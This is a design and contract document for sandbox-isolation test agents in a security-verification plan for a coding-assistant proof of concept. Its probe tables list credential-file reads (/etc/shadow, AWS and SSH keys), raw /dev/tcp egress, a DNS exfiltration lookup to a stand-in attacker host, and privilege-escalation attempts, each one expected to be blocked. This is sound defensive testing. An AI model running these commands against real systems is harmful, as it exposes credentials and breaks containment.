# Test Agents — design & contract

This document describes how the POC test agents are structured and specifies, per
agent, the probes and their pass criteria. It complements
[`../GitHub-Copilot-App-POC-Security-Verification-Plan.md`](../GitHub-Copilot-App-POC-Security-Verification-Plan.md)
section B.7 — the plan is the *spec*, the agents are the *implementation*.

## Architecture

```
run.py                      CLI: list / describe / run, evidence-log output
agents/
  base.py                   framework: Backend, Probe, ProbeResult, TestResult, registry
  group2/                   Containment, isolation & egress (SC-07 … SC-12)
    sc07_*.py … sc12_*.py   one TestAgent subclass per case, @register-ed
sandbox/
  Dockerfile                minimal non-root sandbox-target image
  launch.sh                 hardened (and --insecure) launch wrapper
  policy/sandbox-policy.json centrally-pushed policy stand-in (root-owned, read-only)
```

### Core concepts (`agents/base.py`)

- **Backend** — *where* a probe runs.
  - `DockerBackend` — `docker exec` into the sandbox container under test.
  - `HostBackend` — runs on the local machine (git worktrees, file-permission models).
  - `ManualBackend` — never executes; forces `BLOCKED` + manual steps.
- **Probe** — one observable action with a security expectation:
  - `secure_when="fail"` → a correctly-isolated sandbox makes the command **fail**
    (non-zero exit). E.g. reaching the network.
  - `secure_when="succeed"` → the command **should** succeed. E.g. an allowlisted host,
    or an authorised admin change.
- **`evaluate_probe`** scores the outcome → `secure ∈ {True, False, None}`
  (`None` = couldn't execute).
- **`TestAgent.aggregate`** rolls probe results into a `TestResult.status`:
  `PASS` (all executed probes secure, ≥1 executed), `FAIL` (any insecure),
  `BLOCKED` (nothing executed).
- **Registry** — `@register` adds an agent keyed by `id`; the CLI discovers them via
  `all_agents()` / `agents_by_group()`.

### The agent contract

```python
@register
class SCxx(TestAgent):
    id = "SC-xx"; group = N
    control = "…"; method = "…"; expected = "…"; must_pass = True
    requires = "human-readable prerequisites"

    def execute(self, ctx: RunContext) -> TestResult:
        # build probes, choose a backend, run, aggregate, return self.result(...)
```

`execute` must **never raise** for an expected failure — failures are returned as
`FAIL`/`BLOCKED` data with evidence. (An unexpected crash is caught by the runner and
recorded as `ERROR` so one bad agent can't abort the suite.)

Honesty rules baked into the agents:
- A control that needs a live tenant returns `BLOCKED` with manual steps — never a
  fake `PASS`.
- A local model that can only *support* (not fully prove) a control caps its status at
  `BLOCKED`/`PASS` with a note stating what live evidence is still required (SC-08, SC-10, SC-12).
- Probes are designed so a real bypass shows up as `FAIL` — verified with the
  `--insecure` negative-control target.

---

## Group 2 — Containment, isolation & egress

### SC-07 — Local sandbox isolation  *(Docker)*
Execs probes inside the hardened container; **all must be blocked**:

| Probe | Command (essence) | Secure when |
|-------|-------------------|-------------|
| `fs-read-outside-workspace` | `cat /etc/shadow` | fail (non-root) |
| `fs-read-host-credentials` | read `/host/...ssh`, `/root/.aws/credentials` | fail (paths absent) |
| `fs-write-outside-workspace` | `touch /etc/itest_marker` | fail (read-only rootfs) |
| `net-egress-tcp` | bash `/dev/tcp/1.1.1.1/53` | fail (`--network none`) |
| `net-egress-http` | `curl http://example.com` | fail |
| `priv-escalate-mount` | `mount -t tmpfs none /mnt` | fail (`--cap-drop ALL`) |
| `priv-escalate-su` | `su root -c true </dev/null` | fail (non-root + no-new-privs) |

PASS = every probe blocked. **Maps to:** plan SC-07.

### SC-08 — Local sandbox central enforcement  *(Docker + manual)*
The centrally-pushed policy (`/etc/itest/sandbox-policy.json`, root-owned `0444`) must
be **present**, declare `userCanDisable=false`, and be **immutable to the non-root
user**. The local override probe can *disprove* enforcement (→ `FAIL`); a clean result
is capped at `BLOCKED` because the Intune distribution + device-compliance evidence is
captured manually. **Maps to:** plan SC-08.

### SC-09 — Worktree session isolation  *(Host / git)*
Builds a throwaway repo + two `git worktree`s for "session A/B" and asserts:
B can't see A's uncommitted secret file; A's edit doesn't leak into B; each session has
an independent HEAD. Optional: two sandbox containers can't read each other's volume.
PASS = no cross-session leakage. **Maps to:** plan SC-09.

### SC-10 — Cloud sandbox ephemerality & deletion  *(Simulation + manual)*
Runs a reference state-machine of the documented lifecycle and asserts:
`Stopped` ⇒ snapshot restorable; restart ⇒ data restored; `Deleted` ⇒ environment +
snapshot gone and restore fails. `--simulate` records a model `PASS`; default is
`BLOCKED` pending live-tenant evidence (API/audit-log delete event). **Maps to:** plan SC-10.

### SC-11 — Agent firewall (egress allowlist)  *(Docker)*
From the default-deny container, **all must be blocked** and recorded ("attempts logged"):

| Probe | Essence | Secure when |
|-------|---------|-------------|
| `block-non-allowlisted-http` | `curl https://example.com` | fail |
| `block-raw-tcp-egress` | raw `/dev/tcp` to a public IP:443 | fail |
| `block-dns-exfil` | `getent hosts data-exfil-marker.attacker.example` | fail |
| `allow-allowlisted-host` *(only with `--proxy`)* | `curl https://api.github.com` via proxy | succeed |

PASS = non-allowlisted egress blocked. The allowlist-*allow* path needs the egress
proxy (`--proxy`) or is verified manually. **Maps to:** plan SC-11.

### SC-12 — Agent firewall change control  *(Host / model)*
Models the allowlist as a protected file + append-only audit log and asserts:
a non-privileged write is **rejected**; a privileged change **succeeds**; the change is
**recorded** in the audit log (actor, action, before/after, timestamp). PASS = all three.
Cross-check the live enterprise audit log via manual steps (see SC-24/SC-25).
**Maps to:** plan SC-12.

---

## Evidence output

`run.py --json` emits the full structured result (every probe command, exit code,
clipped stdout/stderr, and the security verdict). `run.py --evidence` emits a Markdown
table matching **Appendix C** of the plan (Case ID · Date · Tester · Result · Evidence
refs · Notes), ready to paste into the POC report.

## Extending to other groups

Create `agents/groupN/`, add `scNN_*.py` modules each defining a `@register`-ed
`TestAgent`, and import the package from `agents/__init__.py`. The same Backend/Probe
model covers Group 1 (action gating), Group 3 (CodeQL/secret scanning), etc.; reuse
`HostBackend`/`DockerBackend` or add a new backend (e.g. a GitHub-API backend for the
audit/MCP groups).
